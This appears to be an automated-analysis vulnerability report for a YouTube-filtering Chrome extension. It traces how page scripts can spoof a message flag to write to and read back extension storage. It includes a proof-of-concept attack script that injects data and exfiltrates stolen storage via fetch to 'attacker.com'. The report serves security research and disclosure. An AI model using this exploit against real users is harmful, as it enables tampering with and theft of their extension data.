# CoCo Analysis: bbeaicapbccfllodepmimpkgecanonai

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (consolidated - same vulnerability pattern)

---

## Sink: storage_local_get_source → window_postMessage_sink (Complete Storage Exploitation Chain)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bbeaicapbccfllodepmimpkgecanonai/opgen_generated_files/bg.js
Line 1074	storage = data.storageData;
Line 1031	const sendData = { filterData: {}, options: data.options };
Line 1041	sendData.filterData.vidLength = data.filterData.vidLength;
Line 1042	sendData.filterData.javascript = data.filterData.javascript;

**Code:**

```javascript
// Step 1: Attacker injects data into storage (cs_0.js, line 543-550)
window.addEventListener('message', (event) => {
  if (event.source !== window) return;
  if (!event.data.from || event.data.from !== 'BLOCKTUBE_PAGE') return;  // ← Attacker-controlled flag

  switch (event.data.type) {
    case 'contextBlockData': {
      events.contextBlock(event.data.data);  // ← attacker-controlled data
      break;
    }
  }
}, true);

// Step 2: Content script sends to background (cs_0.js, line 492-509)
const events = {
  contextBlock(data) {
    // ... formatting ...
    const entries = [`// Blocked by context menu (${data.info.text}) (${now})`];
    const id = Array.isArray(data.info.id) ? data.info.id : [data.info.id];
    entries.push(...id);  // ← attacker-controlled
    port.postMessage({
      'type': 'contextBlock',
      'data': {'type': data.type, 'entries': entries}  // ← attacker-controlled
    });
  }
};

// Step 3: Background writes to storage (bg.js, line 1087-1091)
port.onMessage.addListener((msg) => {
  switch (msg.type) {
    case 'contextBlock': {
      storage.filterData[msg.data.type].push(...msg.data.entries);  // ← attacker data
      chrome.storage.local.set({storageData: storage});  // Write sink
      break;
    }
  }
});

// Step 4: Storage change triggers broadcast (bg.js, line 1100-1103)
chrome.storage.onChanged.addListener((changes) => {
  if (has.call(changes, 'storageData')) {
    storage = changes.storageData.newValue;  // ← includes attacker data
    compiledStorage = utils.compileAll(changes.storageData.newValue);
    utils.sendFiltersToAll();  // Broadcast to all content scripts
  }
});

// Step 5: Background sends storage to content scripts (bg.js, line 1048, 1051-1054)
sendFiltersToAll() {
  Object.keys(ports).forEach((p) => {
    ports[p].postMessage({
      type: 'filtersData',
      data: { storage, compiledStorage }  // ← includes attacker data
    });
  });
}

// Step 6: Content script receives and posts to webpage (cs_0.js, line 475-480)
utils.sendStorage() {
  window.postMessage({
    from: 'BLOCKTUBE_CONTENT',
    type: 'storageData',
    data: compiledStorage || globalStorage,  // ← attacker data flows back
  }, document.location.origin);
}

// Step 7: MAIN world script receives the data (cs_2.js runs in MAIN world, line 2151-2157)
window.addEventListener('message', (event) => {
  if (event.source !== window) return;
  if (!event.data.from || event.data.from !== 'BLOCKTUBE_CONTENT') return;

  switch (event.data.type) {
    case 'storageData': {
      storageReceived(event.data.data);  // ← attacker can access this
      break;
    }
  }
}, true);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage - Complete storage exploitation chain on YouTube pages

**Attack:**

```javascript
// From malicious script injected on YouTube (e.g., via XSS or malicious ad)
// Since cs_2.js runs in MAIN world, attacker can set the required flag

// Step 1: Write malicious data to extension storage
window.postMessage({
  from: 'BLOCKTUBE_PAGE',  // Required flag - attacker can set this
  type: 'contextBlockData',
  data: {
    type: 'channelId',  // or 'title', 'videoId', etc.
    info: {
      id: ['ATTACKER_INJECTED_DATA', 'MORE_MALICIOUS_DATA'],
      text: 'Injected by attacker'
    }
  }
}, "*");

// Step 2: Listen for storage data to be sent back
window.addEventListener('message', (event) => {
  if (event.data.from === 'BLOCKTUBE_CONTENT' && event.data.type === 'storageData') {
    console.log('Stolen extension storage:', event.data.data);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(event.data.data)
    });
  }
});

// Trigger storage read/broadcast
window.postMessage({
  from: 'BLOCKTUBE_PAGE',
  type: 'ready'
}, "*");
```

**Impact:** Complete storage exploitation chain allowing both write and read access to extension storage. An attacker on YouTube (via XSS, malicious ads, or compromised third-party scripts) can inject arbitrary data into the extension's storage and read back all stored data including user's blocking filters and preferences. The vulnerability exists because cs_2.js runs in MAIN world, allowing attackers to set the required `from: 'BLOCKTUBE_PAGE'` flag. This violates the principle that extension storage should not be accessible to web content.
